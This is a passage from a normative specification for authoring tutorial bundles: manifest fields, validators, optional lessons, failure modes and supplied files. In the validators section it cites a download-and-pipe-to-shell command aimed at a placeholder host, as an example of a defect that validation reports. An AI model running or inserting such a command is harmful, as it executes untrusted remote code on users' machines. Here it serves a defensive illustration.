# Tutorial Bundle Format — Authoring Contract

**Format version:** `bundle_format: 1`
**Status:** normative. A bundle that violates a MUST in this document is invalid.

This document is self-contained. You need nothing else to author a bundle.

---

## 0. Start here

A **bundle** is a course. It is written once and used by many learners.

An **instance** is one learner's copy of that course, with their progress in it.

**You are authoring a bundle. You are not authoring an instance.**

This is the single most common mistake, and it is easy to make when you already know
how one particular learner's run went. Everything you know about *a learner's progress*
must be left out of what you write.

| You know | Where it goes |
|---|---|
| What the course teaches | the bundle — you are writing this |
| The order of the lessons | the bundle |
| Design decisions about the subject | the bundle |
| That lesson 7 is finished | **not the bundle** |
| That the learner is on lesson 8 | **not the bundle** |
| What the learner's code looks like now | **not the bundle** |
| Which tests currently pass | **not the bundle** |

A bundle is used by a learner who has not started yet. Author it for them.

---

## 1. Layout

A bundle is a directory:

```
<bundle-name>/
├── tutorial.yaml         MUST exist
├── COURSE.md             MUST exist
├── DESIGN.md             MUST exist
├── STATE.template.md     MUST exist
├── supplies/             MAY exist: the files a MANIFEST-scope `supplies`
│                         entry hands the learner's workspace
└── lessons/              MUST exist, MUST contain at least one lesson
    ├── 00-<slug>.md              a lesson as a single file
    ├── 01-<slug>/                a lesson as a folder, when it has material
    │   ├── LESSON.md             the lesson itself; exact name, exact case
    │   └── <anything else>       diagrams, data, examples, references
    ├── <slug>.md                 an optional lesson: off the main path, no
    │                             number prefix, offered rather than sequenced
    └── ...
```

Every lesson lives in `lessons/`, whether the learner reaches it by walking the course
or by accepting an offer. There is no second lesson directory in a bundle.

`supplies/` is optional and is a convention, not a reserved name: a manifest-scope
`supplies` entry may take its `from` anywhere in the bundle, and `supplies/` is where
authors are told to put those files. A **lesson-scope** entry is different — its `from`
MUST resolve somewhere inside `lessons/`. A lesson folder is the usual home and the one
worth recommending, but it is not required. Section 2, **Supplied files**, says why the
two scopes differ and where a lesson-supplied file may sit.

### The rule that separates a bundle from an instance

> A bundle **MUST** contain `STATE.template.md`.
> A bundle **MUST NOT** contain `STATE.md`.

`STATE.md` is created by the runner when a learner starts the course. It does not exist
until then. If you have written a `STATE.md`, you have written an instance by mistake:
delete it, and move anything in it that describes *the course* (not the learner) into
`COURSE.md`, `DESIGN.md`, or a lesson.

There is no exception. A bundle containing `STATE.md` is rejected.

A second directory is instance-only in exactly the same way: `lessons.generated/`, where a
tutor writes lessons during a course. A bundle MUST NOT contain one. Section 8 says what
to do when you find one, and how to promote a lesson out of it properly.

---

## 2. `tutorial.yaml`

Keep it shallow, and the ceiling is a measured one rather than a slogan: **the deepest
shape this format uses is three levels of container, with scalars at the leaves. Nothing
reaches a fourth.**

Most fields are a scalar or a flat list. Five keys are a map of maps whose inner values
include a flat list, and each is that shape because the thing it describes really is:

| Key | Level 1 | Level 2 | Level 3 |
|---|---|---|---|
| `optional_lessons` | lesson path | that lesson's fields | `offer_at`, `anticipates`, `required_for` |
| `failure_modes` | failure-mode id | that mode's fields | `signals` |
| `validators` | validator name | that validator's definition | `command` |
| `covers` | concept id | that concept's definition | `aliases` |
| `assumes` | concept id | that concept's definition | `aliases` |

The other nested shape is one level of list over one level of mapping, with scalars
underneath — `supplies`, `setup_validators` and the two recommendation lists. A field
that seems to want a fourth level wants to be that shape instead.

```yaml
bundle_format: 1
id: rust-automaton-db
title: Learn Rust by Building AutomatonDB
description: >
  Project-driven Rust taught by building a masterless, partitioned,
  automaton-indexed database from scratch.
subjects: [rust, databases, distributed-systems]
aliases: [cassandra-like, storage-engine]
level: intermediate-to-advanced
style: [project-driven, interactive, long-form]

lessons:
  - lessons/00-foundations.md
  - lessons/01-rows-cells-temporal.md
  - lessons/02-typed-keys-table-hierarchy.md

optional_lessons:
  lessons/interior-mutability.md:
    offer_at:      [lessons/02-typed-keys-table-hierarchy.md]
    offer_because: >
      A shared cache behind an immutable handle needs interior mutability, and
      the borrow checker will not explain which tool to reach for.
    anticipates:   [shared-cache-needs-refcell]
    repair_in:     lessons/02-typed-keys-table-hierarchy.md

failure_modes:
  shared-cache-needs-refcell:
    summary: >
      Two owners need to mutate one cache, so the design grows a clone per
      call rather than a shared cell.
    signals: [validator:cargo-check, diagnosis]

workspace_kind: existing-or-new-repository
tutor_owned:    [tutorial/STATE.md, tutorial/DESIGN.md]
learner_owned:  [src/**, tests/**, Cargo.toml]
ownership_policy: tutor-must-not-edit-learner-owned

validators:
  cargo-check: { kind: command, command: [cargo, check] }
  cargo-test:  { kind: command, command: [cargo, test] }
  has-lib:     { kind: file-exists, path: src/lib.rs }

one_task_at_a_time: true
solution_code: on-request-only
advance_on: validated-evidence-only
```

### Field reference

| Field | Required | Meaning |
|---|---|---|
| `bundle_format` | MUST | Always `1` for this document. |
| `id` | MUST | Stable, unique, `[a-z0-9-]+`. Never changes once published. |
| `title` | MUST | Human-facing course name. |
| `description` | MUST | One or two sentences. Shown when a learner is choosing. |
| `teaching_method` | MAY | One or two sentences on how the course teaches. Shown in the first-load banner, below `description`. Non-empty when declared. |
| `subjects` | MUST | Lowercase topic tags used for discovery, e.g. `[rust, databases]`. |
| `aliases` | SHOULD | Extra terms a learner might say instead of a subject. |
| `level` | MUST | e.g. `beginner`, `intermediate`, `intermediate-to-advanced`. |
| `style` | SHOULD | e.g. `project-driven`, `interactive`, `exercise-based`. |
| `lessons` | MUST | Ordered list of lesson paths — the main path. See below. |
| `optional_lessons` | MAY | Authored lessons off the main path, offered rather than sequenced. See **Optional lessons** below. |
| `failure_modes` | MAY | Stable ids for the ways a learner's work goes wrong. See **Failure modes** below. |
| `supplies` | MAY | Files the bundle hands the learner's workspace, placed by the runner and never assigned as a task. See **Supplied files** below. |
| `covers` | MAY | The concepts this course teaches, each with a summary. See **Concepts and relationships** below. |
| `assumes` | MAY | The concepts this course uses without teaching from first principles, each with a level and a summary. Never a gate. See **Concepts and relationships** below. |
| `recommended_follow_ups` | MAY | Bundles worth taking after this one, in display order, each with a reason. Advisory only. |
| `recommended_previous_bundles` | MAY | Bundles worth taking before this one, in display order, each with a reason. Advisory only. |
| `workspace_kind` | MUST | See below. |
| `tutor_owned` | MUST | Globs the tutor may modify. |
| `learner_owned` | MUST | Globs the tutor must not modify. |
| `ownership_policy` | MUST | See below. |
| `validators` | MUST (may be `{}`) | Named validators lessons may reference. |
| `setup_validators` | MAY | Checks the runner performs itself, unprompted, rather than assigning them: a list of `name` + `describe` entries naming validators from `validators`. See **Setup validators** below. |
| `one_task_at_a_time` | SHOULD | Default `true`. |
| `solution_code` | SHOULD | `on-request-only` or `freely`. |
| `advance_on` | SHOULD | `validated-evidence-only` or `learner-assertion`. |

**A top-level field this table does not list is warned about, never rejected.** Check 28
names it and the bundle still validates. A manifest is data a newer runner may extend, and
a validator that refused a key it had not heard of would reject precisely the bundle
written for the next version of this format — the failure that section 13's rule of
degrading rather than refusing exists to prevent. One key is exempt in both directions:
`instance`, the stamp recording what an instance was materialized from. It is absent from
the table because the runner writes it and you do not, and check 28 says nothing about it
either way — a *bundle* carrying one is check 7's finding.

Read the warning anyway, because a misspelled field has no other signal anywhere. A runner
reads `tutorial.yaml` by field name and ignores a name it does not know, so
`teaching_methods` is not a broken `teaching_method`; it is nothing at all. The course runs
on, the banner is one sentence shorter, and without check 28 nothing anywhere says why. A
key close to a field this table lists is called out as the likely misspelling it almost
always is.

**Warning about an unknown key never excuses a missing one.** A bundle is unusable when a
MUST field is **absent**, and absence is still a finding: check 8 reports every required
field that is not there. So renaming `lessons` to `lesson` produces both reports in one
run — check 8's finding that `lessons` is gone, which fails the bundle, and check 28's
warning naming the spelling that ate it, which is the only thing in the run that says where
the list went.

**`teaching_method`** is the course's method in the learner's own words. `style` and the
teaching switches — `one_task_at_a_time`, `solution_code`, `advance_on` — already say that
kind of thing to a machine, in tags and enums; this field says it to the person about to
take the course, in a sentence they read once. `description` says what a learner will come
away knowing; `teaching_method` says what taking the course is like — that the learner
writes every line and the tutor reads it back, that the course adapts each later step to a
language the learner picks, that no lesson advances on an assertion. The runner shows it
once, in the banner it draws when it creates the instance, directly below `title` and
`description` (`state-lifecycle.md` section 3, step 7). Nothing else shows it, and the
catalogue does not carry it: a catalogue entry is metadata for *choosing* a course, and
this sentence is for the learner who has already chosen.

It is optional, and it stays optional. A bundle that declares no `teaching_method` draws a
banner one sentence shorter, and nothing warns — which is the reason the text lives in this
manifest rather than in a file of its own: every bundle published before the field existed
already declares `title` and `description`, so every one of them shows a banner without an
edit. Declare it when the course's method is something a learner would otherwise have to
infer from the first lesson, and leave it out rather than restate `description` in other
words. When you do declare it, it MUST be a non-empty string.

**`lessons`** is the authoritative lesson sequence — the **main path**, which every
learner walks in order. It defines two things nothing else does:

- **which lesson is first** — it is `lessons[0]`. There is no separate `entry_lesson`
  field; one ordered list is the single source of truth.
- **what "the next lesson" means** when one completes. Do not rely on filenames sorting
  correctly; the list is the order.

Every entry MUST resolve to a real file, and every **lesson** in `lessons/` MUST be
listed exactly once — in `lessons` when it is on the main path, or in `optional_lessons`
when it is not. A lesson in neither list is invisible to the runner and is reported as an
error, not silently skipped. A lesson in both is reported too: the main path is walked in
order and an optional lesson is offered, and nothing can be both.

"Every lesson" means every top-level `.md` file plus every folder containing a
`LESSON.md`. Supporting files inside a lesson folder are material, not lessons, and MUST
NOT appear in either list.

Name lessons by path, the same form used by `active_lesson`, so every reference to a
lesson looks identical everywhere. An entry always names the Markdown file, whether the
lesson is a single file or a folder:

```yaml
lessons:
  - lessons/00-foundations.md                 # single-file lesson
  - lessons/01-automaton-machinery/LESSON.md  # foldered lesson
```

Both forms may appear in the same bundle. Nothing else in the format changes.

**`workspace_kind`** — one of:

- `existing-or-new-repository` — the course builds software; use the learner's repo or make one
- `new-repository` — the course must start from a fresh repository
- `none` — the course builds no software; the instance lives in a plain directory

Not every tutorial builds software. If yours does not, use `none` and leave
`learner_owned` as an empty list.

**`ownership_policy`** — one of:

- `tutor-must-not-edit-learner-owned` — the normal choice for a course where the learner writes the code
- `on-request` — the tutor may edit learner files when explicitly asked
- `unrestricted` — the tutor may edit freely (rare; use only for courses where the learner is not writing the artifact)

**A scaffold the tutor invents has no grant under the strict policy.** The exemption below
is what lets the tutor create a file it was told to create, and it reaches **declared paths
only** — a project layout the tutor works out for itself declares none, so
`tutor-must-not-edit-learner-owned` forbids it however plainly the lesson asks. A course
whose setup step cannot be shipped as files, because it depends on something the learner
chooses, selects `on-request` and has the tutor ask before it builds anything. The cost is
real and is stated where that value is defined: the relaxation holds for the whole course,
not for the one lesson that needed it.

**So say in the lesson what the tutor may create, and where it stops.** The policy value
is course-wide, and the lesson that needed the relaxation is the only place the promise
`COURSE.md` makes to the learner can still be kept. Name the limit, not only the
permission: "the tutor may set the project up" grants nothing the policy had not granted
already, and leaves a tutor reading it three lessons later no edge to stop at.
`portable-fixed-window-rate-limiter` in `skomp/belay-bundles` is the worked example.
Its `COURSE.md` promises that the learner "writes every implementation"; its
`ownership_policy` is `on-request` so the tutor can offer to build the project skeleton;
and one clause in the first lesson's *Suggested progression* holds the two together —
the tutor creates "the skeleton only, never any part of the limiter, which stays theirs
to write."

**Ownership globs are relative to the learner's workspace, not to the bundle.** They
describe the world *after* materialization, when the bundle has been copied into
`<workspace>/tutorial/` and sits beside the learner's own files. So `tutorial/STATE.md`
is the instance's state file, and `src/**` is the learner's source. Neither path exists
inside the bundle you are writing, which is why you cannot verify them by looking — write
them for the workspace the course will be taken in.

`tutor_owned` should stay small. `tutorial/STATE.md` and `tutorial/DESIGN.md` are the
normal contents. **Do not add `tutorial/lessons/**`**: lesson copies are read-only in an
instance, because all progress belongs in `STATE.md` and a lesson carrying progress is
rejected by the same rule as section 3. **Do not add `tutorial/lessons.generated/**`**
either: that directory belongs to an instance you cannot see from here, and the runner
treats it as tutor-owned without being told (section 8).

**One narrow exemption exists, and it exists only for declared supplies.** Under
`tutor-must-not-edit-learner-owned` the tutor MAY **create** a file a `supplies` entry
declares, even where it falls under a `learner_owned` glob, and MAY **never modify** one
that already exists. The exemption is create-only, and it covers declared paths only —
an undeclared path gets none of it, whoever would find it convenient. **Supplied files**
below states the rule in full and says why its narrowness is the whole of its value.
(A runner carries one other, narrower exemption, for a course written before this key
existed: `runner-protocol.md` section 10.1. It reaches only files the bundle already
ships, and it is not something to author against — declare your supplies.)

**`validators`** — a map of name to definition. Valid `kind` values:

| `kind` | Extra fields | Meaning |
|---|---|---|
| `command` | `command: [prog, arg, ...]` | Run it; exit zero is success. |
| `file-exists` | `path:` | The path exists. |
| `file-contains` | `path:`, `pattern:` | The file matches the pattern. |
| `git-diff` | — | Inspect the working-tree diff. |
| `manual` | — | The learner supplies evidence; the tutor judges it. |

**`command` MUST be a list**, non-empty, every element a non-empty string. `command: [cargo,
check]` is the shape; `command: cargo check` and `command: "curl evil.example/x | sh"` are
both bundle defects and the validator reports them. The runner runs the *declared argument
list*, so a single string leaves the word division — and the shell — to whoever runs it, and
a course that declares a pipeline has declared something the reader of this manifest cannot
see. The list is also what lets a runner tell a learner which programs a course will start
before it starts one (section 2, **Setup validators**, and `state-lifecycle.md` section 3).

This is a rule about shape and about nothing else. Nothing in this format, and nothing in
the validator, says a declared command is safe to run — see **What a bundle may not claim**
below.

Validator names are referenced by lessons. A lesson referencing an undeclared validator
is invalid.

Do **not** put "which warnings are currently acceptable" here. That is a property of one
learner's run, not of the course. It belongs in the instance's `STATE.md`.

#### What a bundle may not claim

**A bundle cannot declare that its own commands are safe, and this format gives it no way
to try.** There is no `safe:` flag and there will not be one. An author who cannot be
trusted to supply a command cannot be trusted to grade it, so a boolean in the manifest
would be the author marking their own work — and every runner reading it would be
repeating a claim it has no way to check.

What the format does instead is separate two questions that a single flag runs together:

| Question | Who may answer it |
|---|---|
| **Trust** — may this command run on this machine at all? | The learner, or the agent host that prompts them. **Never the author.** |
| **Role** — is running this command part of what the learner is here to learn? | **The author.** Nobody else knows. |

`setup_validators` carries the second and only the second. Declaring a validator as setup
buys you nothing you did not already have: the host's own permission prompt applies to
every command whatever its role, and the declaration decides only who types it afterwards
and whether it counts as the learner's evidence. That is exactly why it is safe to let an
author make it.

### Setup validators — `setup_validators`

> A bundle **MAY** declare `setup_validators`: checks the runner performs itself, before
> the learner is asked for anything, rather than assigning them as exercises.

A course uses `cargo check` for two different jobs. As evidence that the learner's code
compiles it is the exercise, and running it is itself part of learning Rust, so the learner
should run it. Run straight after the runner has placed a skeleton, purely to confirm the
setup is sound, it teaches nothing — and handing that one to the learner is toil. The
authoring rubric scores exactly that at −2: *deterministic and unambiguous; no decision; a
mistake teaches nothing — and the bundle could have handed the result over instead of
assigning it.* `supplies` already says this about files. This key says it about checks.

Because the same validator serves both jobs in one course, **role is a property of the
invocation, not of the validator definition.** So there is no `role:` field inside
`validators`; there is a second list, and membership is what distinguishes the two — the
shape `lessons` and `optional_lessons` already use.

```yaml
# tutorial.yaml — manifest scope. Runs once, after materialization places supplies.
setup_validators:
  - name: cargo-check
    describe: confirms the placed skeleton compiles before the first lesson
```

```yaml
# lesson frontmatter — the same shape. Runs when the lesson opens.
setup_validators:
  - name: cargo-check
    describe: confirms the starter files still build before you change them
validators: [cargo-check]     # unchanged: evidence of the learner's work
```

`validators` keeps exactly its present meaning, and a bundle that declares no
`setup_validators` is valid exactly as it stands. There is no migration.

The key holds a **list** of entries. An entry is a mapping of exactly two keys, and one
carrying any other key is reported rather than ignored — as in `supplies`, an unknown key
here is almost always a misspelling of one of the two.

| Field | Required | Meaning |
|---|---|---|
| `name` | MUST | A validator declared in `validators`. It MUST resolve, and its `kind` MUST NOT be `manual`. |
| `describe` | MUST | One non-empty sentence, in your words, saying what this check confirms. The runner says it to the learner before it runs the check, and telling them is the only reason the field exists. |

**Why `describe` is required here and absent from `validators`.** A setup validator runs on
the learner's behalf *without being asked*, so it owes the same explanation
`supplies.describe` owes. An exercise validator does not: the lesson the learner is reading
already says why they are running it. The asymmetry is the disclosure principle applied
exactly where something happens unprompted.

**`kind: manual` is refused, and it is the one kind that is.** `manual` means *the learner
supplies evidence; the tutor judges it* — inherently the learner's work, so it cannot be
something the tutor performs unprompted on their behalf. `command`, `file-exists`,
`file-contains` and `git-diff` are all legitimate setup checks, and a `file-exists` setup
check is disclosed to the learner exactly as a `command` one is: what the disclosure is
about is that something happens **unprompted**, not that something is risky.

**Scope decides timing, exactly as it does for `supplies`.**

| Declared in | Run |
|---|---|
| `tutorial.yaml`, at the top level | once during materialization, after the manifest's supplies are placed and before the first lesson opens |
| a lesson's frontmatter | when that lesson opens, before its first task |

**A setup validator is not a learner failure and is not progress.** When one fails, the
bundle or the environment is wrong — never the learner's work, which does not exist yet —
so it is never handed back as a correction. And nothing about a setup validator is recorded
as progress, the same rule `supplies` carries. `runner-protocol.md` section 14 states what
the runner does in both directions, including what happens when a manifest-scope setup
check fails at materialization.

### Optional lessons — `optional_lessons`

**This is not the same thing as a lesson's *Optional deeper paths* section.** That is
material inside one lesson, read on request, and section 6 keeps it. It is also not a
generated side lesson, which one tutor writes for one learner during one course
(section 8). An **optional lesson** is authored by you, shipped in the bundle, available
to every learner, and simply not on the main path.

The main path is `lessons`, and every learner walks it in order. An optional lesson is
one the tutor **offers**: the learner takes it, or declines it and carries on.

Two author intentions share one mechanism:

- **enrichment** — a topic worth an hour to a learner who wants it. It is offered once at
  the point you name, and if they decline, that is the end of it;
- **anticipation** — you can see that a choice the learner is about to make leads to a
  recognisable failure. The tutor warns them briefly, offers the lesson, and lets them
  defer it. When the failure actually arrives, the tutor connects it to the topic they
  set aside and offers the lesson again.

The second is what this part of the format is really for, and it is the only one that
needs `failure_modes`. An optional lesson that declares no `anticipates` is enrichment,
which keeps ordinary optional material possible without inventing a failure for it.

```yaml
optional_lessons:
  lessons/event-time-and-watermarks.md:
    offer_at:      [lessons/04-window-execution.md]
    offer_because: >
      Windows keyed on arrival time put a delayed record in whichever window is
      open when it arrives, not the one it belongs to.
    anticipates:   [late-event-wrong-window, window-never-closes]
    repair_in:     lessons/04-window-execution.md
    required_for:  [lessons/06-correctness-under-delay.md]
```

| Field | Required | Meaning |
|---|---|---|
| the key | MUST | The lesson's path, in the form `lessons` uses. It MUST resolve to a lesson, and MUST NOT also appear in `lessons`. |
| `offer_at` | MUST | Non-empty list of `lessons` entries. The tutor raises the offer when one of them becomes the active lesson, before that lesson's first task. |
| `offer_because` | MUST | One or two sentences, written for the learner, that the tutor says when it offers the lesson. For an anticipatory lesson, this names the risk. |
| `anticipates` | SHOULD | Failure-mode ids declared in `failure_modes`. Omit it for enrichment. |
| `repair_in` | SHOULD | The `lessons` entry whose implementation the learner repairs after taking this lesson. Meaningful only with `anticipates`. |
| `required_for` | MAY | `lessons` entries that cannot be completed while an anticipated failure stands. The gate is on the failure, not on this lesson: it opens when the failure clears, however it cleared. Requires a non-empty `anticipates`. |

**`offer_at` is what makes the lesson reachable**, and it is the same rule the main path
obeys: a lesson nothing can reach is invisible. An empty `offer_at` is rejected rather
than read as "offer it whenever you like".

**`offer_because` lives in the manifest and not in the lesson, deliberately.** The tutor
reads `tutorial.yaml` every turn and opens exactly one lesson file. If the sentence it
needs in order to *offer* a lesson lived inside that lesson, offering would cost one file
open per optional lesson per turn — which is the cost this whole format exists to avoid.
`anticipates`, `repair_in` and `required_for` are here for the same reason: the tutor has
to act on them without opening anything.

**`repair_in` is not the way back.** The lesson a detour returns to is recorded in the
instance, at the moment the detour starts, from where the learner is actually standing —
that is `resume_at`, and `state-lifecycle.md` section 8.3 explains why it is never
derived from a declared field. `repair_in` answers a different question: *whose work is
now wrong?* The two differ whenever a failure surfaces later than the code that caused
it, which is the ordinary case for an anticipated failure. A learner who defers at lesson
04 and trips the failure while standing in lesson 06 returns to **06**, and repairs what
**04** built.

**`required_for` gates the failure, never the lesson.** It says these main-path lessons
cannot be completed **while an anticipated failure stands**, and the gate opens the moment
that failure clears — by whatever route cleared it. The optional lesson does not become
required, and taking it is not what lifts the gate; the learner's own code no longer
producing the failure is.

So a learner who declined the lesson and then meets the gate is not in a dead end. The
tutor teaches the repair as ordinary coaching inside the lesson they are standing in — no
transition, no fresh offer — and advances when the failure clears. The optional lesson
remains the better route and stays available; it is never the only one. Reading
`required_for` the other way produces a course whose only exit is a lesson the learner has
already refused twice, which contradicts the invariant in section 13 that a course must be
completable by a learner who declines every offer. `runner-protocol.md` section 8.7 is the
tutor's side of this.

Use it sparingly and only where the blocked lesson genuinely cannot be finished with the
failure in place. Everything else stays an offer.

Nothing here records whether any learner was offered a lesson, deferred it or took it.
That is progress: it lives in the instance's `STATE.md`, in the section
`state-lifecycle.md` section 9 defines.

### Failure modes — `failure_modes`

A **failure mode** is a stable name for a recognisable way a learner's work goes wrong.
It is the middle of three terms, and keeping the three apart is the point of having it at
all:

| Layer | What it is | Where it lives |
|---|---|---|
| evidence | what was observed — a validator failed, an output carried a token, you read the code | the learner's workspace and the validator output |
| failure mode | what the tutor concluded from that evidence | `failure_modes`, by id |
| the lesson | what addresses it | an optional lesson's `anticipates` |

```yaml
failure_modes:
  late-event-wrong-window:
    summary: >
      A record that arrives after its window closed is counted in whichever
      window is open when it arrives.
    signals:
      - validator:late-events
      - token:LATE_EVENT_MISBINNED
      - diagnosis
  window-never-closes:
    summary: A window that receives no later record never emits its result.
    signals: [validator:test-suite, diagnosis]
```

| Field | Required | Meaning |
|---|---|---|
| the key | MUST | A stable id, `[a-z0-9-]+`. Never reuse one for a different failure. |
| `summary` | MUST | One sentence in the learner's terms naming what goes wrong. This is what the tutor says when it connects an observed failure to a deferred lesson. |
| `signals` | SHOULD | The forms of evidence that may indicate this failure mode. |

A `signals` entry is one of three forms:

| Entry | Means |
|---|---|
| `validator:<name>` | that validator failing. `<name>` MUST be declared in `validators`. |
| `token:<TOKEN>` | a stable identifier appearing in a check's output, emitted by a check you control. |
| `diagnosis` | the tutor inferred it from the learner's code or from observed behaviour. |

**`signals` is evidence, not a rule.** It tells the tutor which observations are worth
weighing. It never decides that a failure mode occurred — the diagnosis stays with the
tutor, exactly as every other judgement in this format does, and `runner-protocol.md`
section 8.4 states that normatively.

This is why there is no field that matches raw compiler or test output. A course whose
re-offer depends on an error string breaks the first time a toolchain rewords it, and it
cannot express the cases that matter most: a named test failing, a fault-injection run
behaving exactly as designed, or a design you can see is wrong before it has failed
anything. Name the failure, and let the evidence point at the name.

**Prefer `token:` to `diagnosis` when a check you wrote can emit one.** A test that prints
`LATE_EVENT_MISBINNED` on the assertion that catches the bug turns a judgement into an
observation, and it survives every rewording of everything around it.

**A failure mode no optional lesson anticipates can never do anything.** Declare the ones
your optional lessons name, and no others.

### Supplied files — `supplies`

> A bundle **MAY** declare `supplies`: the files it hands the learner's workspace, placed
> by the runner and never assigned as a task.

A course that ships a model, a dataset, a fixture or a set of starter shaders has to get
them into the learner's workspace somehow. Doing that as a lesson task costs the learner a
file copy and teaches them nothing, and it is the commonest way an otherwise good course
spends its first lesson on toil. `supplies` is the alternative: you declare where the file
lives in the bundle and where it belongs in the workspace, the runner puts it there and
says so, and the lesson gets on with the subject.

**A `supplies` entry MUST NOT hand the learner what a lesson asks them to write.** That
is the author's half of this key and it is the one limit nothing else enforces. Removing
toil is the whole of the remit: fixtures, assets, data, a scaffold the course is not
teaching. `from: assets/solution/` with `to: src/` breaks no rule stated below — at
course start no target exists, so nothing is overwritten, and every path is declared, so
the ownership exemption covers all of it — and it quietly hands the tutor the learner's
code to write, with `ownership_policy` untouched and every guarantee apparently intact.
The exemption is drawn narrowly on the tutor's side precisely so that the declaration
list cannot be made to do what the policy was stopped from doing.

**And `supplies` reaches only as far as the bundle itself.** Every `from` resolves inside
the bundle, so the key hands over exactly what the bundle ships and nothing else. Setup
that needs something from outside it — a file to fetch over the network, a toolchain to
install, an account to create — is not a supply and cannot be declared as one. That work
stays the learner's, and a lesson is right to ask for it. The two limits bound the same
axis from opposite ends: the paragraph above says what may be handed over, and this one
says where it may come from.

```yaml
supplies:
  - from: assets/models/Duck.glb
    to:   public/models/Duck.glb
    describe: "Duck.glb: the sample model every loader lesson renders"
  - from: assets/shaders/
    to:   src/shaders
    describe: The starter shaders, so the first lesson changes GLSL rather than typing it
```

The key holds a **list** of entries. An entry is a mapping of exactly three keys, and one
carrying any other key is reported rather than ignored — an unknown key here is almost
always a misspelling of one of the three.

| Field | Required | Meaning |
|---|---|---|
| `from` | MUST | The source, **relative to the bundle root**. A trailing `/` means the *contents* of that directory, recursively; without one it names a single file. It MUST resolve to something the bundle actually contains, and MUST NOT point inside `lessons.generated/`, which exists only in an instance. A **manifest-scope** `from` may resolve anywhere in the bundle; a **lesson-scope** `from` MUST resolve inside `lessons/`. See **Where a `from` may point** below. |
| `to` | MUST | The destination, relative to the **learner's workspace** root. It MUST be relative, MUST NOT contain `..`, and MUST NOT begin with `tutorial/`. Separate components with `/`. A `to` of `.` is the workspace root itself and is legal; with a directory `from` it scatters a whole tree across the learner's own files, which is the most collision-prone destination a bundle can choose. |
| `describe` | MUST | One non-empty line, in your words, naming what these files are. The runner says it to the learner, which is the only reason the field exists. |

**`from` is bundle-root-relative in both scopes** — one rule, and no scope-dependent
resolution to remember. A `from` of `assets/models/Duck.glb` means
`<bundle>/assets/models/Duck.glb` whether it is declared in `tutorial.yaml` or in the
frontmatter of `lessons/13-load-gltf-model/LESSON.md`. It is never relative to the lesson's
own folder.

#### Where a `from` may point

Resolution is the same in both scopes; what each scope may *reach* is not, and **timing is
what decides it**. A manifest-scope entry is placed **during** materialization, while the
bundle source is still in reach, so its `from` may resolve anywhere in the bundle. A
lesson-scope entry is placed when that lesson **opens** — long after materialization, from
an instance that holds only `tutorial.yaml`, `COURSE.md`, `DESIGN.md` and `lessons/` — so
its `from` MUST resolve inside `lessons/`.

| Declared in | `from` may resolve | Because |
|---|---|---|
| `tutorial.yaml`, at the top level | anywhere in the bundle | placement happens while the bundle source is still in reach |
| a lesson's frontmatter | inside `lessons/` only | placement happens from the instance, which carries only `lessons/` |

A lesson-scope `from` pointing outside `lessons/` is a **bundle defect**, not a style
choice: materialization does not copy it, so the file is simply not there when the tutor
opens that lesson. Manifest-scope files have no such constraint, and `supplies/` at the
bundle root is where to keep them (section 1).

**`lessons/` is the whole of the requirement, and a lesson folder is not part of it.**
Supplying a file does not turn a single-file lesson into a foldered one. `lessons/00-hello-args.md`
may declare `from: lessons/seed.txt` with `seed.txt` sitting loose beside it, and that
bundle validates in both modes. Where a supplied file may sit under `lessons/` is decided
by section 6's rule about what counts as a lesson, not by this key:

| Where the file sits | Legal | Why |
|---|---|---|
| inside a lesson folder, beside a `LESSON.md` | yes — **and this is the recommendation** | the file travels with the lesson that uses it, and a reader finds it where they look for it |
| loose directly under `lessons/`, not named `*.md` | yes | it is neither a top-level `.md` file nor a folder, so section 6 does not read it as a lesson |
| loose directly under `lessons/`, named `*.md` | **no** | a top-level `.md` file under `lessons/` **is** a lesson: it must carry `id` and `title` frontmatter and be listed in `lessons` or `optional_lessons` |
| in a subdirectory of `lessons/` that has no `LESSON.md` | **no** | a folder directly under `lessons/` without a `LESSON.md` is not a lesson, and everything in it is unreachable |

So the folder is advice, and the two `no` rows are the rule. Prefer the folder anyway: a
lesson whose material sits beside it is the shape section 6 is written around, and a loose
file under `lessons/` belongs to no lesson in particular once a second lesson supplies one
too.

**The trailing slash is not decoration.** `assets/shaders/` and `assets/shaders` are not
interchangeable, and neither form is accepted for the other: a directory declared without
the slash is reported, and so is a file declared with one. The slash is the part that says
"everything under here, recursively", and a format that inferred it from whatever happens
to exist on disk would place a whole tree on a typo.

**`to` is the learner's workspace, and `tutorial/` is not part of it.** `tutorial/` is the
instance — the course's own copy of itself, plus the learner's state — so an entry
targeting it is writing into the course rather than handing the learner anything. Section
0 draws that line, and this key does not cross it.

**An empty declaration is silent; a malformed one is not.** `supplies:` with nothing under
it, and `supplies: []`, both declare nothing and mean exactly what the absent key means: a
scaffolded bundle, or one an authoring tool is part-way through editing, carries an empty
declaration legitimately. A value that is present and is neither a list nor empty **is**
reported — a bare scalar, or, far the commonest, a single mapping written directly under
`supplies:` with the `- ` list marker left off. This is deliberately the treatment
`optional_lessons` already gets, for the same reason: silence about nothing declared, noise
about something declared wrongly.

**Scope decides timing, and timing decides the rest.** An entry means the same thing
wherever it is declared. What the two scopes change is *when* the runner acts on it — and,
because of that, where its `from` may point (above).

| Declared in | Placed |
|---|---|
| `tutorial.yaml`, at the top level | once, immediately after materialization, before the first lesson opens |
| a lesson's frontmatter | when that lesson opens, before its first task |

Declare a file in the manifest when the course needs it from the beginning, and in a lesson
when nothing before that lesson uses it — a learner who stops after lesson 3 has no reason
to be carrying lesson 13's model around. A lesson declaring `supplies` MUST be listed in
`lessons` or in `optional_lessons`, like any other lesson: a lesson in neither list is never
opened, so its entries are never placed.

#### The four placement rules

They are worth taking as a set. Together they are what makes re-entering a course safe, and
each one of them is load-bearing.

1. **Never overwrite.** A target that already exists is left exactly as it is. Not compared,
   not merged, not renamed aside and replaced — left.
2. **Say nothing when every target of an entry already exists.** The entry has been applied
   already, so there is nothing to report, and the learner is not told again about a file
   they have had since their first session. This is what makes re-entry idempotent with **no
   new state**: nothing is written to `STATE.md`, nothing is read from the instance's stamp,
   and the workspace itself is the only record of what has been placed.
3. **When some targets were missing, place those, name them, and name the ones you left
   alone.** A partial placement is reported in full — these files are new, these were
   already here and were not touched. Reporting only half of that is what leaves a learner
   guessing.
4. **Name it as setup, not as a lesson.** The runner says what it placed for what it is, a
   setup step, and then teaches. Placed files are not an accomplishment, not a task the
   learner completed, and nothing about them is progress to be recorded.

#### The ownership exemption

Under `ownership_policy: tutor-must-not-edit-learner-owned` the tutor MAY **create** a
declared supplies target that does not exist, even where it falls under a `learner_owned`
glob, and MAY **never modify** one that does. Declaring a path in `supplies` buys that one
permission and nothing else. An undeclared path gets no part of *this* exemption: the
